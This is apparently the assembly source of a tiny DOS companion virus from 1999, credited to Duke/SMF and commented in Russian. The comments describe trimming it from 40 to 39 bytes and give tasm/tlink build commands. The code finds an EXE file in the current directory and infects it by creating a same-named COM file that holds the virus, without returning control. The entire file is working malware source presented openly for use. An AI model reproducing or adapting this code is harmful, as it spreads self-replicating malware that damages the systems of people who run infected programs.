;Было  : C.40 by Duke/SMF  (22.05.99)
;Стало : C.39 by Duke/SMF

;Если в текущем каталоге есть EXE-файл (первый, если их много),
;и у него нет одноименного COM, то поразим (создадим COM) и отвалим.
;Управления не возвращаем, ничерта не проверяем :)
;Мои комментарии отмечены "FD"
; tasm comp39.asm /m
; tlink comp39.obj /t

;Чем дальше в лес, тем больше вылез... (с) Русское Радио
;То бишь - раз начал отсекать команды, то надо доводить дело до конца.

.Model Tiny
.code
.386
org 100h
start:
E_Mask db '*.e*'
;       mov  di,9eh
       xchg cx,ax         ;cx=0
       mov  ah,4eh

       CALL NewFile       ;так мы заюзываем ret дважды

NewFile:
       mov dx,si
       int 21h

;TestFile:
;       mov dx,di
       mov dx,9eh         ;FD : сразу вчехлим сюда
       mov ax,5b2eh
@1:
       scasb
       jne @1
       mov dword ptr [di],' moc'
       int 21h
;       jc @Exit          ;FD : когда придет время все равно сами выйдем ;-))
       xchg bx,ax
       mov ah,40h
       add cl,MyLength    ;FD : и чего это меня на ADD потянуло ???
;@Exit:
       ret
;---
MyLength equ $-start
end start
